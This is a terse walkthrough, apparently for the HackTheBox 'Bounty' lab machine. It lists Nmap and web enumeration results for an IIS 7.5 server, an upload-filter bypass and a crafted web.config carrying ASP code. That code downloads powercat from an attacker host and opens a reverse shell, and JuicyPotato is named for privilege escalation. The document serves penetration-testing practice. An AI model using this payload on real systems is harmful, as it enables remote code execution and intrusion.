# Bounty

### Nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Web Enum

```
Version: Microsoft IIS httpd 7.5

http://10.10.10.93/aspnet_client/
http://10.10.10.93/uploadedfiles/
http://10.10.10.93/transfer.aspx
http://10.10.10.93/aspnet_client/system_web/

http://10.10.10.93/uploadedfiles/test.png
```

### Exploitation

```bash
# file upload 
http://10.10.10.93/transfer.aspx

# upload bypass
script.xxx%20.png

# .config is allowed
xxx.config

# craft web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.29/powercat.ps1');powercat -c 10.10.14.29 -p 443 -e cmd")
%>

```

### Priv Esc

```bash
# JuicyPotato
```
